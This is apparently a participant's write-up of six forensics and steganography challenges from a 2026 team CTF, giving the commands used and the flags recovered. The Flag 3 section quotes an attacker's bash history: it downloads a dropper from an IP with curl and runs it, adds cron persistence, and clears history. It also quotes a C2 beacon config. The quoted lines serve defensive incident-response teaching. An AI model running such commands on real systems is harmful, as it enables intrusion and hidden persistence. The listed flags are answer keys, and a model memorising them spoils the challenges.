# Holmesglen CTF Aug 2026 — Morning Session (AM)

**Event:** Holmesglen CTF Aug 2026, powered by Security Impossible
**Date:** Saturday, 15 August 2026, 10:00 AM – 4:00 PM AEST
**Format:** Team CTF (2 players per team)
**Team:** Parma Packets (Yunho Shin + Tyson Tebb)
**Scoring platform:** https://scoring.securityimpossible.com/
**Theme:** "Operation Nightjar" — investigating a fictional data-broker/interception network across 8 categories (Web Exploitation, OSINT, Binary Exploitation/PWN, Cryptography, Steganography, Reverse Engineering, Mobile, Digital Forensics), 49 challenges total.

This write-up covers the setup process and the first 6 flags captured, solved via the browser-based JumpBox (Guacamole remote desktop into an Ubuntu machine).

---

## Environment Setup

1. Logged into the scoring platform with credentials emailed by Security Impossible.
2. Watched the mandatory ~10 min orientation video (must be watched in full, skipping restarts it).
3. Clicked **JumpBox → Launch in browser** to open a Guacamole-hosted Ubuntu desktop.
4. Guacamole clipboard panel (left sidebar, opened via the tab at the screen edge) was used to move text between the local machine and the JumpBox — useful for copying long file contents (e.g. the PDF participant guide) out of the remote session.
5. Confirmed team assignment on the dashboard: **Parma Packets**, teammate Tyson_Tebb (never became active during the session — all flags captured solo).
6. Read the full **CTF Participant Guide** (17-page PDF on the JumpBox desktop) to understand:
   - Flag format: `sictf{...}`
   - Desktop challenges (Crypto, Stego, RE, Digital Forensics, Mobile) are solved locally from `~/Desktop/Challenges/<Category>/<Challenge>/` — nothing to connect to.
   - Target-machine challenges (Web, OSINT, PWN, two Crypto oracles) are reached over the network at `hg.securityimpossible.ctf:<port>` via browser or `netcat`.
   - Hints are available on the scoring platform but cost points for **the whole team**, not just the individual.

---

## Flag 1 — Digital Forensics: `01_GhostFile` (Easy)

**Challenge premise:** A disk image of a USB stick Nightjar wiped in a hurry. "Deleting isn't the same as destroying."

**Artifact:** `usb_recovered.dd` (16 MB)

**Process:**
1. `file usb_recovered.dd` → confirmed it was an **ext4 Linux filesystem image** (a full byte-for-byte copy of a disk, same concept as a Windows installer ISO but for a USB stick).
2. Mounted it read-only so the original evidence couldn't be altered:
   ```bash
   mkdir -p /tmp/ghostfile_mount
   sudo mount -o loop,ro usb_recovered.dd /tmp/ghostfile_mount
   ```
3. Found a `DCIM/` folder with two visible photos (`IMG_0001.jpg`, `IMG_0002.jpg`, 1148 bytes each, 200x150px). Verified with `exiftool` and Python's PIL (`img.getcolors()`) that both were genuine, single-solid-colour JPEGs with clean metadata — no hidden data in these two.
4. `lost+found` was empty at the filesystem level, so pivoted to **file carving** the raw disk image directly with `foremost`:
   ```bash
   sudo foremost -i usb_recovered.dd -o /tmp/recovered
   ```
   This scans the entire disk image byte-by-byte for file signatures, independent of the filesystem's own (currently empty) record of deleted files — key lesson: filesystem-level "delete" often just marks space as reusable, and the underlying bytes remain until overwritten.
5. `foremost` recovered **3** JPEGs where the mounted filesystem only showed 2 — the third (`00010352.jpg`, 1870 bytes, 320x240) was a previously deleted file invisible through normal browsing.
6. Copied it out (`sudo cp ... && sudo chown user010:user010 ...`) and ran `exiftool` on it.

**Result:** The `Comment` EXIF field contained the flag directly:
```
sictf{d3l3t3d_f1l3_c4rv3d_fr0m_unalloc}
```
(decodes to "deleted file carved from unalloc[ated space]")

**Key takeaway:** When a mounted filesystem view looks clean, carve the raw image with `foremost`/`photorec` — deleted files often survive in unallocated space even when `lost+found` shows nothing.

---

## Flag 2 — Digital Forensics: `02_ChatWreck` (Medium)

**Challenge premise:** Nightjar's chat database, with incriminating messages "deleted." (They should have used a shredder.)

**Artifact:** `messages.db` (SQLite 3 database)

**Process:**
1. `file messages.db` → confirmed SQLite 3.x, 2 pages, file counter 3 (evidence of multiple write operations, consistent with inserts + a delete).
2. Opened with `sqlite3 messages.db`, inspected schema:
   ```sql
   CREATE TABLE messages(id INTEGER PRIMARY KEY, sender TEXT, ts TEXT, body TEXT);
   ```
3. `SELECT * FROM messages;` returned rows with **id 1, 2, 3, 4, 6, 7 — id 5 was missing.** Message 4 (from v.corvid) read "sending it now, delete after reading" — strongly implying message 5 was the deleted payload.
4. SQLite doesn't zero out deleted rows immediately; freed space goes into an internal **freelist** and the old bytes often remain until overwritten. Exited SQLite and ran:
   ```bash
   strings messages.db
   ```
5. Found the orphaned row text still present in the raw file bytes:
   ```
   -yv.corvid2026-07-30 21:17portal token: sictf{sql1t3_d3l3t3d_r0w_fr33l1st_c4rv3}
   ```

**Result:**
```
sictf{sql1t3_d3l3t3d_r0w_fr33l1st_c4rv3}
```
("sqlite deleted row freelist carve")

**Key takeaway:** SQLite `DELETE` doesn't securely erase data — raw `strings`/hex inspection of the `.db` file can recover "deleted" rows sitting in the freelist.

---

## Flag 3 — Digital Forensics: `03_RanFirst` (Medium)

**Challenge premise:** A disk image from a host used to stage a dropper. "Figure out what ran, and what it was told to do."

**Artifact:** `nightjar_host.img` (16 MB, ext4)

**Process:**
1. Mounted read-only (same pattern as GhostFile).
2. Explored the standard Linux filesystem layout (`etc`, `home`, `opt`, `var`, etc.) and located two key log sources:
   - `home/op/.bash_history` — command history for user `op`
   - `var/log/auth.log` — SSH/sudo authentication log
3. `.bash_history` revealed a full compromise chain:
   ```bash
   ls -la
   cd /tmp
   curl -s http://185.243.115.7/n.sh -o n.sh      # download dropper from attacker IP
   chmod +x n.sh
   ./n.sh                                          # execute
   cat /opt/.cache/.beacon.conf                    # check hidden config
   (crontab -l 2>/dev/null; echo '@reboot /opt/.cache/.beacon') | crontab -   # persistence
   rm -f n.sh                                      # anti-forensics: delete original script
   history -c                                      # attempted to clear shell history (failed — history was recoverable from the disk image)
   ```
4. `auth.log` corroborated the timeline: two failed SSH logins from `185.243.115.7`, then a successful login, then a `sudo cp n.sh /opt/.cache/.beacon` command at 03:01:07.
5. Found the beacon config:
   ```
   # nightjar beacon configuration
   C2=darkmarket7.onion
   INTERVAL=3600
   KEY=c2ljdGZ7YjRzaF9oMXN0MHJ5X2RyMHBwM3JfYjM0YzBuX2MwbmZ9
   ```
   The `KEY` value was recognisable as Base64 (started with `c2lj`, which decodes to `sic` — the start of `sictf{`).
6. Decoded it:
   ```bash
   echo "c2ljdGZ7YjRzaF9oMXN0MHJ5X2RyMHBwM3JfYjM0YzBuX2MwbmZ9" | base64 -d
   ```

**Result:**
```
sictf{b4sh_h1st0ry_dr0pp3r_b34c0n_c0nf}
```
("bash history dropper beacon conf")

**Key takeaway:** Classic incident-response workflow — reconstruct an intrusion timeline by correlating shell history with auth logs, and always check for Base64-obfuscated data in "config" files (C2/beacon configs are a common hiding spot).

---

## Flag 4 — Steganography: `02_WhiteNoise` (Easy)

**Challenge premise:** "The script looks totally normal on screen — which is exactly the trick. Look at the ends of the lines." (SNOW-style steganography)

**Artifact:** `deploy_helper.py` — a completely ordinary-looking Python deployment script.

**Process:**
1. `cat deploy_helper.py` showed clean, plausible Python code — nothing visually suspicious.
2. `cat -A deploy_helper.py | head -5` revealed **trailing whitespace on every line** (shown as `^I` for tab, trailing spaces before `$` line-end marker) — invisible in a normal editor but present in the raw bytes.
3. Per the official hint: trailing whitespace encodes binary — **space = 0, tab = 1**, 8 characters (1 byte) per encoded character.
4. Wrote a short Python script to extract and decode:
   ```python
   with open('deploy_helper.py', 'rb') as f:
       lines = f.readlines()
   bits = ''
   for line in lines:
       line = line.rstrip(b'\n')
       trailing = b''
       for ch in reversed(line):
           if ch in (32, 9):          # 32 = space, 9 = tab
               trailing = bytes([ch]) + trailing
           else:
               break
       for ch in trailing:
           bits += '0' if ch == 32 else '1'
   chars = ''
   for i in range(0, len(bits) - 7, 8):
       chars += chr(int(bits[i:i+8], 2))
   print(chars)
   ```

**Result:**
```
sictf{tr41l1ng_wh1t3sp4c3_sn0w_st3g0}
```
("trailing whitespace snow stego")

**Key takeaway:** SNOW steganography hides data in trailing whitespace that's invisible on screen but present in the raw file bytes — always check with `cat -A` (or a hex viewer) when a text file "looks too normal."

---

## Flag 5 — Steganography: `01_ChannelSurf` (Medium)

**Challenge premise:** "An ordinary-looking gradient PNG can still carry data in the part of each pixel your eye can't see." (LSB steganography)

**Artifact:** `intercepted_transmission.png` (256x256, 8-bit RGB PNG)

**Process:**
1. Confirmed the file was a genuine PNG via `file`.
2. Ran `zsteg -a intercepted_transmission.png` — a tool that brute-forces every combination of bit-plane, channel order, and pixel-scan direction looking for hidden data (LSB = least-significant-bit steganography, where the "noise" bit of each colour byte is repurposed to carry a message since it barely affects the visible colour).
3. Scanned the (very long) output for a line containing readable text with `{`/`}` characters. Found:
   ```
   b1,bgr,msb,Xy .. text: "}r3ps1hw_l3nn4hc_bgr_bsl_gnp{ftcis"
   ```
   The braces were in the wrong order relative to a normal flag — a sign the string had been embedded in reverse pixel order.
4. Reversed the string:
   ```bash
   echo "}r3ps1hw_l3nn4hc_bgr_bsl_gnp{ftcis" | rev
   ```

**Result:**
```
sictf{png_lsb_rgb_ch4nn3l_wh1sp3r}
```
("png lsb rgb channel whisper")

**Key takeaway:** `zsteg -a` is the standard tool for brute-forcing LSB steganography across PNG/BMP bit-planes and channel orderings; results may come out reversed depending on the pixel scan direction used to hide the data.

**Note on tool usage:** because zsteg's full output was pasted directly into chat, the suspicious line was spotted quickly by scanning the pasted text. In a real engagement, the same result should be found independently by filtering the tool's own output (e.g. `zsteg -a file.png | grep -iE '\{|sictf'`) or searching a saved output file — and sensitive scan output should never be pasted into an external AI tool unless it's an approved, non-data-retaining enterprise tool.

---

## Flag 6 — Digital Forensics: `05_DeadDrop` (Medium)

**Challenge premise:** "An intercepted email — a classic dead drop. The payload is hiding in plain sight as an attachment."

**Artifact:** `intercepted_message.eml` (raw email source, MIME-formatted)

**Process:**
1. `cat intercepted_message.eml` showed a `multipart/mixed` MIME email from `v.corvid` to `k.finch`, with a Base64-encoded ZIP attachment (`ops_manifest.zip`) embedded directly in the message body under a `Content-Type: application/zip` / `Content-Transfer-Encoding: base64` section.
2. **First two extraction attempts failed** (`base64: invalid input`):
   - Manually retyping the Base64 block into a heredoc (`cat > encoded.b64 << 'EOF' ...`) — risk of transcription error.
   - `awk '/^UEsDBBQ/,/^AQABAD4AACeAAAAAA=$/p' intercepted_message.eml` — range-matching by first/last line accidentally captured extra MIME headers and boundary text along with the real Base64 data (confirmed by `diff`-ing the extracted block against a known-good line range from the file), corrupting the decode.
3. **Fixed by filtering strictly by content**, rather than by line-range matching:
   ```bash
   grep -E '^[A-Za-z0-9+/=]+$' intercepted_message.eml > clean.b64
   base64 -d clean.b64 > ops_manifest.zip
   file ops_manifest.zip   # → "Zip archive data, at least v2.0 to extract"
   unzip ops_manifest.zip  # → inflates ops_manifest.txt
   cat ops_manifest.txt
   ```

**Result:**
```
NIGHTJAR // tonight's manifest
finance portal token: sictf{3m41l_b4s3d64_z1p_4tt4chm3nt_dr0p}
destroy after reading
```
```
sictf{3m41l_b4s3d64_z1p_4tt4chm3nt_dr0p}
```
("email based64 zip attachment drop")

**Key takeaway:** When extracting an embedded Base64 block from a larger text file, filter by **character pattern** (`grep -E '^[A-Za-z0-9+/=]+$'`) rather than by line-range (`awk`/`sed` between start/end markers) — the latter is fragile and can silently include non-Base64 lines (headers, MIME boundaries), producing "invalid input" errors that are hard to diagnose without a byte-level `diff`.

---

## Session Summary

| # | Category | Challenge | Difficulty | Flag |
|---|----------|-----------|------------|------|
| 1 | Digital Forensics | 01_GhostFile | Easy | `sictf{d3l3t3d_f1l3_c4rv3d_fr0m_unalloc}` |
| 2 | Digital Forensics | 02_ChatWreck | Medium | `sictf{sql1t3_d3l3t3d_r0w_fr33l1st_c4rv3}` |
| 3 | Digital Forensics | 03_RanFirst | Medium | `sictf{b4sh_h1st0ry_dr0pp3r_b34c0n_c0nf}` |
| 4 | Steganography | 02_WhiteNoise | Easy | `sictf{tr41l1ng_wh1t3sp4c3_sn0w_st3g0}` |
| 5 | Steganography | 01_ChannelSurf | Medium | `sictf{png_lsb_rgb_ch4nn3l_wh1sp3r}` |
| 6 | Digital Forensics | 05_DeadDrop | Medium | `sictf{3m41l_b4s3d64_z1p_4tt4chm3nt_dr0p}` |

**Tools used:** `file`, `ls -la`, `cat` / `cat -A`, `mount -o loop,ro`, `strings`, `exiftool`, `foremost`, `sqlite3`, `python3` (PIL for pixel/colour inspection, manual bit-decoding script), `zsteg -a`, `rev`, `base64 -d`, `grep -E`, `awk`, `tr -d`, `diff`, `wc`, `unzip`.

**Recurring technique across categories:** "deletion ≠ destruction" — every Digital Forensics flag in this session relied on recovering data that had been deleted/hidden but not securely erased (unallocated disk space, SQLite freelist, trailing whitespace, LSB colour bits, MIME-embedded attachment).

**Remaining challenges noted for later:**
- Digital Forensics: `04_LiveMemory` (Hard — memory dump / Volatility), `06_TimeLine` (Medium — correlate auth.log + access.log)
- Steganography: `04_GridLock` (Medium — QR code in blue-channel LSB plane), `05_FlipBook` (Medium — one flag character per GIF frame), `06_PingStorm` (Hard — data in ICMP echo-request payloads), `07_Palette` (Hard — LSB hidden in BMP palette bytes, not pixels)
- Not yet started: Web Exploitation, OSINT, Binary Exploitation (PWN), Reverse Engineering, Mobile, Cryptography
